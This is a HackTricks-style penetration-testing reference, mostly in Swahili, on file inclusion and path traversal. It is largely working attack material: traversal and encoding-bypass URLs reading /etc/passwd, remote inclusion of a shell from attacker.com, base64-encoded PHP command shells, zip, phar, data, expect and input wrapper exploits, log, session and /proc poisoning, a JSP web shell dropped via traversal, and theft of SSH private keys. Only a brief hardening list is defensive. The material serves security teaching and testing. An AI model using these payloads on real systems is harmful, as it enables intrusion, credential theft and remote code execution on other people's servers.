# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

Remote File Inclusion (RFI): Faili inapatikana kutoka kwenye server ya mbali (Bora: Unaweza kuandika code na server itaiendesha). Katika php hii imezimwa kwa default (allow_url_include).\
Local File Inclusion (LFI): Server inapakia faili ya ndani.

Udhaifu hutokea wakati mtumiaji anaweza kwa namna fulani kudhibiti faili ambayo server itakuwa inapakia.

Vulnerable PHP functions: require, require_once, include, include_once

Chombo kizuri cha kutumia kufaida udhaifu huu: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Nimetengeneza hii kwa kuchanganya orodha kadhaa za *nix LFI na kuongeza njia zaidi:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Jaribu pia kubadilisha `/` kwa `\`\
Jaribu pia kuongeza `../../../../../`

Orodha inayotumia mbinu kadhaa kutafuta faili /etc/password (kuangalia kama udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Muungano wa wordlists tofauti:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Jaribu pia kubadilisha `/` kwa `\`\
Jaribu pia kuondoa `C:/` na kuongeza `../../../../../`

Orodha inayotumia mbinu kadhaa kutafuta faili /boot.ini (kuangalia kama udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Angalia orodha ya LFI ya Linux.

## Basic LFI and bypasses

Mifano yote ni kwa Local File Inclusion lakini inaweza kutumika pia kwa Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences zimeondolewa bila kutumia rekursia
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass kuongeza herufi zaidi mwishoni mwa mfuatano wa herufi uliotolewa (bypass ya: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Hii **imetatuliwa tangu PHP 5.4**

### **Encoding**

Unaweza kutumia encodings zisizo za kawaida kama double URL encode (na zingine):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Kutoka kwenye folder iliyopo

Labda back-end inakagua folder path:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Kuchunguza Saraka za Mfumo wa Faili kwenye Seva

Mfumo wa faili wa seva unaweza kuchunguzwa kwa kurudia (recursively) ili kubaini saraka, si faili tu, kwa kutumia mbinu fulani. Mchakato huu unahusisha kuamua kina cha saraka na kujaribu uwepo wa mafolda maalum. Hapo chini kuna njia ya kina ya kufanikisha hili:

1. **Tambua Kina cha Saraka:** Tambua kina cha saraka yako ya sasa kwa kupata kwa mafanikio faili `/etc/passwd` (inapotumika ikiwa seva inategemea Linux). URL mfano inaweza kuundwa kama ifuatavyo, ikiashiria kina cha tatu:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Ongeza jina la folda inayoshukiwa (kwa mfano, `private`) kwenye URL, kisha rudi `/etc/passwd`. Kiwango cha ziada cha saraka kinahitaji kuongeza depth kwa moja:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tafsiri Matokeo:** Jibu la server linaonyesha ikiwa folda ipo:
- **Hitilafu / Hakuna Matokeo:** Folda `private` huenda haipo katika eneo lililotajwa.
- **Maudhui ya `/etc/passwd`:** Upo wa folda `private` umethibitishwa.
4. **Uchunguzi Rekursivu:** Folda zilizogunduliwa zinaweza kuchunguzwa zaidi kwa ajili ya subdirectories au faili kwa kutumia mbinu ile ile au mbinu za jadi za Local File Inclusion (LFI).

Kwa kuchunguza folda katika maeneo tofauti ya mfumo wa faili, rekebisha payload ipasavyo. Kwa mfano, ili kuangalia kama `/var/www/` ina folda `private` (kwa kuzingatia folda ya sasa iko kwa kina cha 3), tumia:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ni mbinu inayotumika kubadilisha file paths katika web applications. Mara nyingi hutumika kupata files zilizofungiwa kwa kuruka baadhi ya hatua za usalama zinazoongeza herufi za ziada mwishoni mwa file paths. Lengo ni kuunda file path ambayo, mara itakapobadilishwa na hatua ya usalama, bado itaonyesha file inayotakiwa.

In PHP, uwakilishi mbalimbali wa file path unaweza kuchukuliwa kuwa sawa kutokana na tabia ya file system. Kwa mfano:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` zote huchukuliwa kuwa path ileile.
- When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
- Similarly, if `.php` is appended to a file path (like `shellcode.php`), adding a `/.` at the end will not alter the file being accessed.

Mifano iliyotolewa inaonyesha jinsi ya kutumia path truncation kufikia `/etc/passwd`, lengo la kawaida kutokana na yaliyomo hatarishi (taarifa za akaunti za watumiaji):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Katika senario hizi, idadi ya traversals zinazohitajika inaweza kuwa karibu 2027, lakini namba hii inaweza kutofautiana kulingana na usanidi wa server.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) pamoja na dot segments za ziada na characters zinaweza kutumika kuvinjari mfumo wa faili, huku zikifanya server ipuuze nyongeza (kama `.php`) zilizoongezwa.
- **Determining the Required Number of Traversals**: Kwa jaribio na makosa, mtu anaweza kupata idadi sahihi ya `../` inayohitajika kufika kwenye root directory kisha `/etc/passwd`, akiweka uhakika kwamba nyongeza zozote (kama `.php`) zimefanywa zisifanye kazi lakini path inayotakiwa (`/etc/passwd`) inabaki isiyoharibiwa.
- **Starting with a Fake Directory**: Ni desturi ya kawaida kuanza path na directory isiyokuwepo (kama `a/`). Mbinu hii hutumika kama tahadhari au kutimiza mahitaji ya mantiki ya server katika kuchambua path.

When employing path truncation techniques, ni muhimu kuelewa tabia ya server katika kuchambua path na muundo wa mfumo wa faili. Kila senario inaweza kuhitaji mbinu tofauti, na mara nyingi majaribio yanahitajika ili kugundua njia yenye ufanisi zaidi.

**Udhaifu huu ulirekebishwa katika PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Katika php hili limezimwa kwa chaguo-msingi kwa sababu **`allow_url_include`** iko **Off.** Inapaswa kuwa **On** ili lifanye kazi, na katika hali hiyo unaweza kujumuisha faili ya PHP kutoka kwenye seva yako na kupata RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ikiwa kwa sababu fulani **`allow_url_include`** iko **On**, lakini PHP iko kwenye **filtering** ya upatikanaji wa kurasa za nje, [kulingana na chapisho hili](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), unaweza kutumia kwa mfano data protocol pamoja na base64 ku-decode msimbo wa PHP wa b64 na kupata RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Katika msimbo uliopita, `+.txt` ya mwisho iliongezwa kwa sababu mshambuliaji alihitaji string iliyomalizika na `.txt`, hivyo string inamalizika nayo na baada ya b64 decode sehemu hiyo itarudisha tu takataka na PHP halisi itajumuishwa (na kwa hivyo, itatekelezwa).

Mfano mwingine **kutokutumia `php://` protocol** ungekuwa:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Kipengele cha mzizi

Katika python, katika msimbo kama huu:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ikiwa mtumiaji anapitisha **absolute path** kwa **`file_name`**, **njia ya awali inaondolewa tu**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Hii ni tabia iliyokusudiwa kulingana na [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ikiwa sehemu ni absolute path, vipengele vyote vya awali vinatupwa na kuunganishwa kunaendelea kutoka kwa sehemu ya absolute path.

## Java: Kuorodhesha Folda

Inaonekana kwamba ikiwa una Path Traversal katika Java na ukaomba **folda** badala ya faili, **orodha ya folda inarudishwa**. Hii haitatokea katika lugha nyingine (kwa kadri ninavyojua).

## Vigezo 25 vya Juu

Hapa kuna orodha ya vigezo 25 za juu ambazo zinaweza kuwa hatarini kwa local file inclusion (LFI) vulnerabilities (kutoka [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters zinaruhusu kufanya operesheni za msingi za **mabadiliko ya data** kabla ya kusomwa au kuandikwa. Kuna aina 5 za filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Ondoa tags kutoka kwenye data (kila kitu kati ya "<" na ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . Ili kupata **orodha ya encodings zote** zinazoungwa mkono, endesha kwenye console: `iconv -l`

> [!WARNING]
> Kwa kutumia vibaya conversion filter ya `convert.iconv.*` unaweza **kutengeneza maandishi yoyote**, ambayo inaweza kuwa muhimu kuandika maandishi yoyote au kufanya function kama include isindike maandishi hayo. Kwa maelezo zaidi angalia [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Sehemu "php://filter" haitegemei herufi (case insensitive)

### Kutumia php filters kama oracle kusoma faili yoyote

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) imependekezwa mbinu ya kusoma faili ya ndani bila kupata output ikirejeshwa na server. Mbinu hii inategemea **boolean exfiltration of the file (char by char) using php filters** kama oracle. Hii ni kwa sababu php filters zinaweza kutumika kufanya maandishi kuwa makubwa vya kutosha hadi php itokee exception.

Katika original post unaweza kupata maelezo ya kina ya mbinu, lakini hapa ni muhtasari mfupi:

- Tumia codec **`UCS-4LE`** ili kuweka herufi ya mbele ya maandishi mwanzoni na kufanya ukubwa wa string kuongezeka kwa mfumuko.
- Hii itatumika kuzalisha **maandishi ambayo ni makubwa sana wakati herufi ya kwanza inakisia kwa usahihi** kiasi kwamba php itasababisha **error**.
- The **dechunk** filter itakayokuwa inafanya **remove everything if the first char is not an hexadecimal**, kwa hivyo tunaweza kujua kama herufi ya kwanza ni hex.
- Hii, ikichanganywa na ile ya hapo juu (na filters nyingine kulingana na herufi inayokisia), itaturuhusu kukisia herufi mwanzoni kwa kuona lini tunafanya mabadiliko ya kutosha kuifanya isiwe tabia ya hexadecimal. Kwa sababu ikiwa ni hex, dechunk haitafuta na bomu la mwanzo litasababisha php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). Hii inatuwezesha kugundua kama herufi ya kwanza ni `a`, kwa mfano, kwa sababu tukitumia codec hii mara 6 a->b->c->d->e->f->g herufi haitakuwa tena katika safu ya hexadecimal; hivyo dechunk haitaitoa na php error itachochewa kwa sababu inazidisha na bomu la mwanzo.
- Kutumia mabadiliko mengine kama **rot13** mwanzoni inawezekana ku leak herufi nyingine kama n, o, p, q, r (na codecs nyingine zinaweza kutumika kuhamisha herufi nyingine katika safu ya hex).
- Wakati herufi ya mwanzo ni namba ni lazima ui- base64 encode na leak herufi 2 za kwanza ili kupata namba.
- Tatizo la mwisho ni kuona **jinsi ya leak zaidi ya herufi ya mwanzo**. Kwa kutumia order memory filters kama **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** inawezekana kubadilisha mpangilio wa herufi na kupata katika nafasi ya kwanza herufi nyingine za maandishi.
- Na ili kuwa na uwezo wa kupata **further data** wazo ni **kuzalisha bytes 2 za takataka mwanzoni** kwa **convert.iconv.UTF16.UTF16**, tumia **UCS-4LE** ili kuifanya **pivot with the next 2 bytes**, na d**elete the data until the junk data** (hii itatoa bytes 2 za mwanzo za maandishi ya awali). Endelea kufanya hivi hadi ufikie sehemu unayotaka ku leak.

Katika post pia ilifichuliwa zana ya kufanya hii kiotomatiki: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Wrapper hii inaruhusu kufikia file descriptors ambazo process imefungua. Inaweza kuwa muhimu kuexfiltrate content ya files zilizo wazi:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Unaweza pia kutumia **php://stdin, php://stdout and php://stderr** kufikia **file descriptors 0, 1 and 2** mtawalia (sijui jinsi hii ingekuwa muhimu katika shambulio)

### zip:// and rar://

Pakia faili la Zip au Rar lenye PHPShell ndani na ufikie it.\
Ili kuweza kutumia vibaya rar protocol, **inahitaji kuamilishwa kwa njia maalum**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Kumbuka kwamba itifaki hii imezuiwa na usanidi wa php **`allow_url_open`** na **`allow_url_include`**

### expect://

Expect inapaswa kuamilishwa. Unaweza execute code kwa kutumia hii:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Taja payload yako katika vigezo vya POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Faili ya `.phar` inaweza kutumika kutekeleza msimbo wa PHP wakati programu ya wavuti inatumia kazi kama `include` kwa ajili ya kupakia faili. Mfano wa msimbo wa PHP uliotolewa hapa chini unaonyesha utengenezaji wa faili `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Ili kujenga faili ya `.phar`, amri ifuatayo inapaswa kutekelezwa:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

Kwenye kesi ambapo LFI inafanya tu kusoma faili bila kutekeleza msimbo wa PHP ndani yake, kupitia functions kama `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, au `filesize()`, kujaribu udhuru wa deserialization kunaweza kufanywa. Udhaifu huu unahusiana na kusoma faili kwa kutumia protocol ya `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ilikuwa inawezekana kutumia vibaya **any arbitrary file read from PHP that supports php filters** ili kupata RCE. Maelezo ya kina yanaweza [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Muhtasari mfupi: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
Ilikuwa inawezekana ku-alloc chunks of specific sizes abusing more php filters.

### More protocols

Angalia zaidi possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Andika kwenye memory au kwenye faili ya muda (siwezi kuona jinsi hii inaweza kuwa muhimu katika file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Kufikia filesystem ya ndani
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Kufikia URLs za HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Kufikia URLs za FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Mtiririko wa compression
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Kutafuta pathnames zinazofanana na pattern (Hakirudishi kitu chochote kinachoweza kuchapishwa, hivyo sio muhimu hapa)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Haifai kusoma faili za aina yoyote)

## LFI via PHP's 'assert'

Hatari za Local File Inclusion (LFI) katika PHP ni kubwa hasa pale unaposhughulika na function 'assert', ambayo inaweza kutekeleza msimbo uliomo katika strings. Hii ni tatizo hasa ikiwa ingizo lenye characters za directory traversal kama ".." linachunguzwa lakini halijasafishwa ipasavyo.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ingawa hili linakusudia kuzuia traversal, kwa bahati mbaya linaleta vektori ya code injection. Ili kutumia hili kusoma yaliyomo kwenye faili, mshambuliaji anaweza kutumia:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Vivyo hivyo, kwa kutekeleza amri za mfumo yoyote, mtu anaweza kutumia:
```plaintext
' and die(system("id")) or '
```
Ni muhimu **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Mbinu hii inahusu matukio ambapo **undhibiti** **njia ya faili** ya **function ya PHP** ambayo itafikia faili lakini hautaona yaliyomo ya faili (kama simu rahisi kwa **`file()`**) lakini yaliyomo hayajaonyeshwa.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Kwa muhtasari, mbinu inatumia **"UCS-4LE" encoding** ili kufanya yaliyomo ya faili kuwa hivyo **big** kiasi kwamba **PHP function inayofungua** faili itasababisha **kosa**.

Kisha, ili leak char ya kwanza filter **`dechunk`** inatumiwa pamoja na nyingine kama **base64** au **rot13**, na hatimaye filters **convert.iconv.UCS-4.UCS-4LE** na **convert.iconv.UTF16.UTF-16BE** zinatumiwa kuweka chars nyingine mwanzoni na leak hizo.

**Functions ambazo zinaweza kuwa hatarini**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Kwa maelezo ya kiufundi angalia chapisho lililotajwa!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Tambua primitive ya kuandika katika endpoint au background worker inayokubali path/filename na inaandika content kwenye disk (mfano, message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Tambua web-exposed directories. Mifano ya kawaida:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Tengeneza traversal path inayovunja kutoka directory ya kuhifadhi yaliyokusudiwa hadi webroot, na jumuisha webshell content yako.
- Tembelea payload uliouacha na utekeleze amri.

Vidokezo:
- Huduma iliyo vulnerable inayofanya uandikaji inaweza kusikiliza kwenye port isiyo-HTTP (mfano, a JMF XML listener on TCP 4004). Portal kuu ya web (port tofauti) baadaye itahudumia payload yako.
- Katika stacks za Java, uandishi wa faili mara nyingi umefanywa kwa concatenation rahisi ya `File`/`Paths`. Ukosefu wa canonicalisation/allow-listing ndio kasoro kuu.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Uimarishaji unaozuia aina hii ya hitilafu:
- Tathmini kuwa path ni canonical na uhakikishe ni subdirectory ya directory ya msingi iliyoorodheshwa.
- Kataa path yoyote yenye `..`, root za absolute, au herufi za drive; pendelea majina ya faili yaliyozalishwa.
- Endesha writer kama akaunti yenye vibali vidogo na gawanya directories za kuandika kutoka kwa served roots.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Kumbuka kwamba **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Pia, hakikisha umeandika payload ipasavyo au PHP itatoa kosa kila mara itakapojaribu kupakia log file na hautapata nafasi ya pili.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Njia nyingine za log zinazowezekana:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Kupitia Barua pepe

**Tuma barua pepe** kwa akaunti ya ndani (user@localhost) ambayo ina PHP payload yako kama `<?php echo system($_REQUEST["cmd"]); ?>` na ujaribu kuijumuisha katika barua pepe ya mtumiaji kwa njia kama **`/var/mail/<USERNAME>`** au **`/var/spool/mail/<USERNAME>`**

### Kupitia /proc/*/fd/*

1. Pakia shells nyingi (kwa mfano: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), ambapo $PID = PID ya process (can be brute forced) na $FD ni file descriptor (can be brute forced too)

### Kupitia /proc/self/environ

Kama faili ya log, tuma payload kwenye User-Agent; itaonekana ndani ya faili /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Kupitia upload

Ikiwa unaweza upload faili, ingiza tu shell payload ndani yake (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Ili kufanya faili iwe rahisi kusomeka, ni bora kuingiza kwenye metadata ya picha/doc/pdf

### Kupakia faili la ZIP

Pakia ZIP file iliyo na PHP shell iliyobanwa, kisha upate ufikiaji:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Kupitia PHP sessions

Angalia kama tovuti inatumia PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Katika PHP sessions hizi zinahifadhiwa ndani ya _/var/lib/php5/sess\\_\[PHPSESSID]\_ files
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Weka cookie kuwa `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Tumia LFI kujumuisha faili ya session ya PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Kupitia ssh

Ikiwa ssh iko active, angalia ni user gani anatumika (/proc/self/status & /etc/passwd) na jaribu kufikia **\<HOME>/.ssh/id_rsa**

### **Kupitia** **vsftpd** _**rejista**_

Rejista za FTP server vsftpd zipo katika _**/var/log/vsftpd.log**_. Katika hali ambapo Local File Inclusion (LFI) vulnerability ipo, na upatikanaji wa server ya vsftpd iliyo wazi unawezawezekana, hatua zifuatazo zinaweza kuzingatiwa:

1. Injiza payload ya PHP kwenye uwanja wa username wakati wa mchakato wa login.
2. Baada ya injection, tumia LFI kupata rejista za server kutoka _**/var/log/vsftpd.log**_.

### Kupitia php base64 filter (kutumia base64)

Kama inavyoonyeshwa katika [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makala, PHP base64 filter huwapuuza wahusika wasiokuwa base64. Unaweza kutumia hilo kupita ukaguzi wa extension ya faili: ukitoa base64 inayomalizika na ".php", itapuuza "." na kuongeza "php" kwenye base64. Hapa kuna payload ya mfano:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

